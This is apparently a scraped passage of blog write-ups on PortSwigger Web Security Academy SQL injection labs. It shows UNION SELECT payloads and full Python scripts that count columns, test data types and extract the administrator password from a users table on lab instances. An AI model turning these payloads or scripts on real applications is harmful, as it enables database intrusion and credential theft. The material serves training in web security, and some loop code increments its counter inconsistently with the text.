Looking at the way the page we returns information can infer the query being run is similar to the below.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; AND [rest of query] When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39; AND [rest of query] However when we add another quote it becomes the below, closing off the first quotation mark we provided.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39;\u0026#39; AND [rest of query] UNION SELECT Requirements: As the lab wants us to display the data using a UNION SELECT query we also need to ensure that the two requirements for this attack are met:\nThe queries must return the same amount of columns: This means that if the original query that is searching the database returns 5 columns our UNION query must also return 5 columns.\nTo solve this issue: We will enumerate the number of columns being returned by the original query. The data types in the columns must be compatible with each query: This means that if the table is returning strings such as item names in column 1 our UNION query has to also return strings or a compatible data type.\nTo solve this issue: Initially we will use a simple method of returning NULL values. This is because NULL is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns. Establishing The Number Of Columns Using UNION SELECT Statement Using Burp: In order for us to display data we need to establish how many columns are in the existing database.\nIf we return back to repeater we can enter the payload\n\u0026#39; UNION SELECT NULL-- We then select the payload \u0026amp; press CTRL+U to URL encode it. If we send this payload we get a 500 response meaning the number of columns is not correct, so add another NULL so our payload and repeat the process.\n\u0026#39; UNION SELECT NULL,NULL-- We keep doing this, increasing the NULL value until we have the payload below which returns a 200 response.\n\u0026#39; UNION SELECT NULL,NULL,NULL-- We can also see the additional column is being displayed at the bottom of the table with no (NULL) values. This means the table has 3 columns.\nUsing Python: Prep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL:\nWe declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint. +Note+: The category and URL vary from instance to instance.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a5e00c103ca8c1c82d124d600ec0021.web-security-academy.net/filter?category=Pets\u0026#34; SQL Syntax \u0026amp; Counters:\nSo now we have our payload broken up into various elements, the reason for this is because we don\u0026rsquo;t want to just supply a list of multiple UNION SELECT statements, doing it this way offers more flexibility as well as ensuring we don\u0026rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn\u0026rsquo;t advise that but you could)\nWe also create a counter variable and set it to 2. This counter is used to track how many NULL values (columns) are in our UNION SELECT payload as we build it. Our starting payload is:\npayload = union + nullPayload # \u0026#34;\u0026#39; UNION SELECT NULL\u0026#34; So before the loop runs we already have one NULL in the query. Inside the loop, we keep appending more ,NULL values to payload and update counter to reflect the number of columns.\nWe don’t start the counter at 0 because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first NULL column. If we started from 0, the value of counter would always lag behind the actual number of NULL columns in the query. By starting at 2, the value of counter stays aligned with the true column count once we begin adding additional NULL values in the loop.\nunion=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 For Loop With Request: We declare a for loop will which repeat for 10 total iterations.\nThen we have a try block which will send our get request to the url with payload \u0026amp; comment.\nResponse Monitoring: We then monitor the responses and if the value \u0026ldquo;My account\u0026rdquo; is found in the body of the response we will:\nPrint the string \u0026quot;Valid payload {payload}-- there are {counter} columns.\u0026quot; which will contain the actual payload as well as the number of columns. Print the full Lab URL including comment and payload so we can easily verify it in a browser. If these above conditions are met it will break out of the loop and stop the process.\nIf the above is not found it will add an additional NULL value using the additionalNull variable to the payload \u0026amp; increment the counter by 1 and continue.\nfor i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) break payload=payload+additionalNull counter+=i Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a5e00c103ca8c1c82d124d600ec0021.web-security-academy.net/filter?category=Pets\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) break payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Running The Script: As we can see it tells what we expect, there are 3 columns and the correction payload is:\n\u0026#39; UNION SELECT NULL,NULL,NULL-- Establishing Column Data Type VIA UNION SELECT Statement: Using Burp: Much like how we established the number of columns we can use repeater to determine the column data type.\nWe know to pass the lab we need to display a specific string so we will not systematically start replacing the NULL values of our payload with the string values 'a'. This means our payload becomes:\n\u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,NULL,NULL-- As we can see this didn\u0026rsquo;t work. We now modify our payload so the string value is in the second NULL position and revert the first position to be NULL again.\n\u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;,NULL-- We can see this time it worked and that our \u0026lsquo;a\u0026rsquo; is displayed in the table. Now to solve the lab all we have to do is copy the randomly generated string from the lab into our payload string position.\n\u0026#39;+UNION+SELECT+NULL,\u0026#39;fooOGX\u0026#39;,NULL-- And we have solved the lab. Using Python: +Note+: I did this on a new instance of the lab so the string to display is a different value. We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we L\u0026quot;\nSend our Request:\nrequest=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {newPayload}--\u0026#34;) print(f\u0026#34;Lab Url: {url+union+newPayload+comment}\u0026#34;) break Next we send out request like before but this time we are using our new payload. We also need to ensure we send the \u0026quot;union\u0026quot; variable as this is not currently present in our list/string/payloadstring.\nWe also perform the same type of check in the body of the request for the string \u0026ldquo;My account\u0026rdquo; which will signify that we have had a 200 OK response, and in this event it will print out the payload \u0026amp; lab string \u0026amp; then break out of the loop.\nReset The NULL Value:\npayloadList[y] = \u0026#34;NULL\u0026#34; In the event that we do not get a 200 response we rest the list position y to be NULL again as other wise the list would just be full of the lab string.\nAs you can see it worked and we solve the lab. ",

        "content": "Lab 5: SQL injection UNION attack, retrieving data from other tables: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.\nInitial Reconnaissance/Discovery: We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a \u0026ldquo;My account\u0026rdquo; section.\nWe already know the \u0026ldquo;category\u0026rdquo; parameter is vulnerable based on the previous lab however let\u0026rsquo;s re-verify this.\nEstablishing SQLi: If we send request to repeater we can inject a single quote ' after the parameter and see we trigger a 500 response. If then add a single another quote we can see that the page returns a 200 OK response. Inferring The SQL Query Being Run: Looking at the way the page we returns information can infer the query being run is similar to the below.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; AND [rest of query] When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39; AND [rest of query] However when we add another quote it becomes the below, closing off the first quotation mark we provided.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39;\u0026#39; AND [rest of query] UNION SELECT Requirements: As the lab wants us to retrieve data using a UNION SELECT query we also need to ensure that the two requirements for this attack are met:\nThe queries must return the same amount of columns: This means that if the original query that is searching the database returns 5 columns our UNION query must also return 5 columns.\nTo solve this issue: We will enumerate the number of columns being returned by the original query. The data types in the columns must be compatible with each query: This means that if the table is returning strings such as item names in column 1 our UNION query has to also return strings or a compatible data type.\nTo solve this issue: Initially we will use a simple method of returning NULL values. This is because NULL is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns \u0026amp; eventually extract data. Establishing The Number Of Columns Using UNION SELECT Statement: Using Burp: In order for us to display data we need to establish how many columns are in the existing database.\nIf we return back to repeater we can enter the payload\n\u0026#39; UNION SELECT NULL-- We then select the payload \u0026amp; press CTRL+U to URL encode it. If we send this payload we get a 500 response meaning the number of columns is not correct, so add another NULL so our payload and repeat the process.\n\u0026#39; UNION SELECT NULL,NULL-- This time we get a 200 response so we know this particular table has 2 columns. Note: If we navigate to the browser and paste the payload in we can see it renders correctly however no products are displayed this is due to the fact that we are commenting out the remainder of the legitimate SQL query and this appears to be responsible for pulling the products for display. Using Python: As usual I am going to show how this can also be solved using Python.\nPrep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL:\nWe declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint. Note: The category and URL vary from instance to instance.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0aa9007a0350e042804fee0b002f0021.web-security-academy.net/filter?category=Gifts\u0026#34; SQL Syntax \u0026amp; Counters:\nSo now we have our payload broken up into various elements, the reason for this is because we don\u0026rsquo;t want to just supply a list of multiple UNION SELECT statements, doing it this way offers more flexibility as well as ensuring we don\u0026rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn\u0026rsquo;t advise that but you could)\nunion=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 We also create a counter variable and set it to 2. This counter is used to track how many NULL values (columns) are in our UNION SELECT payload as we build it. Our starting payload is:\npayload = union + nullPayload # \u0026#34;\u0026#39; UNION SELECT NULL\u0026#34; So before the loop runs we already have one NULL in the query. Inside the loop, we keep appending more ,NULL values to payload and update counter to reflect the number of columns.\nWe don’t start the counter at 0 because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first NULL column. If we started from 0, the value of counter would always lag behind the actual number of NULL columns in the query. By starting at 2, the value of counter stays aligned with the true column count once we begin adding additional NULL values in the loop.\nFor Loop With Request: We declare a for loop will which repeat for 10 total iterations.\nThen we have a try block which will send our get request to the url with payload \u0026amp; comment.\nResponse Monitoring: We then monitor the responses and if the value \u0026ldquo;My account\u0026rdquo; is found in the body of the response we will:\nPrint the string \u0026quot;Valid payload {payload}-- there are {counter} columns.\u0026quot; which will contain the actual payload as well as the number of columns. Print the full Lab URL including comment and payload so we can easily verify it in a browser. If these above conditions are met it will break out of the loop and stop the process.\nIf the above is not found it will add an additional NULL value using the additionalNull variable to the payload \u0026amp; increment the counter by 1 and continue.\nfor i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) break payload=payload+additionalNull counter+=i Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0aa9007a0350e042804fee0b002f0021.web-security-academy.net/filter?category=Gifts\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) break payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Running The Script: As we can see it tells what we expect, there are 2 columns and the correction payload is:\n\u0026#39; UNION SELECT NULL,NULL-- Establishing Column Data Type VIA UNION SELECT Statement: Using Burp: Much like how we established the number of columns we can use repeater to determine the column data type.\nWe know to pass the lab we need to extract the administrators username \u0026amp; password, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the NULL values of our payload with the string values 'a'. This means our payload becomes:\n\u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,NULL-- \u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- \u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,\u0026#39;a\u0026#39;-- Note: We know we are looking to extract two string values and the table has two columns so it\u0026rsquo;s pretty easy to infer the solution is the last payload above, however let\u0026rsquo;s go through the motions for comprehensiveness.\nAs we can the first column is compatible with the string datatype. We now modify our payload so the string value is in the second NULL position and revert the first position to be NULL again.\n\u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- We can see this worked again. This means that both columns are compatible with string datatypes (as to be expected) so the final payload below is also valid\n\u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,\u0026#39;a\u0026#39;-- Using Python: We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.\n+compatible=0 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) + payloadList=[nullPayload] * counter + for y in range(len(payloadList)): + if payloadList[y] == \u0026#34;NULL\u0026#34;: + payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; + newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) + request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) + if \u0026#39;My account\u0026#39; in request.text: + print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) + compatible+=1 + if compatible \u0026gt; 1: + print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i Compatible Variable: This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of 0.\ncompatible=0 List Creation: We then create a payloadList that\u0026rsquo;s contents is the value of nullPayload (which is \u0026ldquo;NULL\u0026rdquo;) and this is equal to the value of the counter so if the counter is 2 then the list value is ['NULL', 'NULL']\npayloadList=[nullPayload] * counter List Iteration:\nif payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; We now iterate through the length of the list and if the value of y in the list is equal to NULL (which it will be) we replace that with the with a string called string. So on the first run it would ['string', NULL].\nNew Payload Creation:\nnewPayload=(\u0026#34;,\u0026#34;.join(payloadList)) We then join our list together into a string so we can pass this to our request later, and we ensure we separate with a comma , other wise our payload would be \u0026quot;'string'NULLNULL\u0026quot;\nSend our Request:\nrequest=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) Next we send our request like before but this time we are using our new payload. We also need to ensure we send the \u0026quot;union\u0026quot; variable as this is not currently present in our list/string/payloadstring.\nWe also perform the same type of check in the body of the request for the string \u0026ldquo;My account\u0026rdquo; which will signify that we have had a 200 OK response, and in this event it will print out the payload.\nCompatible Logic Counter: If the above conditions are met we increment our compatible counter by 1. We then perform a check if the counter is greater than 1 and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.\ncompatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) Reset The NULL Value:\npayloadList[y] = \u0026#34;NULL\u0026#34; In the event that we do not get a 200 response we rest the list position y to be NULL again as other wise the list would just be full of the lab string.\nAs we can see when we run the script it prints out the compatible data type fields in position 1 \u0026amp; 2 and also suggests we combine the payloads as they are both valid. Extracting Column Data VIA UNION SELECT Statement: Using Burp: As we know there is a \u0026ldquo;users\u0026rdquo; table that has a \u0026ldquo;username\u0026rdquo; \u0026amp; \u0026ldquo;password\u0026rdquo; column this means we now append our additional UNION query below to display the contents for each column.\n\u0026#39; UNION SELECT username, password FROM users-- We URL encode it by pressing CTRL+U when the text is highlighted We can see this works and the username \u0026amp; passwords for users are displayed with the existing content. We can now login as the administrator to solve the lab. Using Python: We can also use python to extract the administrators password directly too.\nAdditional Import: For us to parse and extract the administrators password we need the BeautifulSoup library.\nfrom bs4 import BeautifulSoup def extractSQLusers(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT username, password FROM users--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass= soup.body.find(string=\u0026#39;administrator\u0026#39;).parent.find_next(\u0026#39;td\u0026#39;).contents[0] print(f\u0026#34;The administrator password is: {administratorPass}\u0026#34;) return True return False Function definition \u0026amp; payload First we define the function called extractSQLusers we then declare our sqlPayload.\ndef extractSQLusers(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT username, password FROM users--\u0026#34; Send a request \u0026amp; store the response: We send our payload and store the response in a variable called response.\nrequest=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text Parse response:\nif \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass= soup.body.find(string=\u0026#39;administrator\u0026#39;).parent.find_next(\u0026#39;td\u0026#39;).contents[0] print(f\u0026#34;The administrator password is: {administratorPass}\u0026#34;) return True return False If we find the string \u0026ldquo;administrator\u0026rdquo; in the response this tells us the table of users has been returned.\nWe pass the HTML body from the HTTP response into beautiful soups HTML parser so it can turn the raw HTML into a structured object we can search through. If we look at this RAW HTML we can see that the username is stored with the th tags \u0026amp; the password is stored with the td tags. We then set the administratorPass variable by find the text node \u0026ldquo;administrator\u0026rdquo;, taking it\u0026rsquo;s parent element th (this contains the username) and finding the next td element in the row that contains the password, we then grab the first child element of this contents[0] which contains the password string.\nCall the Function: We now call the function so it runs after our other conditions are satisfied.\nif \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + extractSQLusers() payloadList[y] = \u0026#34;NULL\u0026#34; As we can see it works when we run it and we are given the administrators password. Whole Script: #!/usr/bin/env python3 import requests import os import urllib.parse requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) from bs4 import BeautifulSoup proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a7700c8038598da8195211100370065.web-security-academy.net/filter?category=Gifts\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 compatible=0 def extractSQLusers(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT username, password FROM users--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass= soup.body.find(string=\u0026#39;administrator\u0026#39;).parent.find_next(\u0026#39;td\u0026#39;).contents[0] print(f\u0026#34;The administrator password is: {administratorPass}\u0026#34;) return True return False for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) payloadList=[nullPayload] * counter for y in range(len(payloadList)): if payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) extractSQLusers() payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) ",
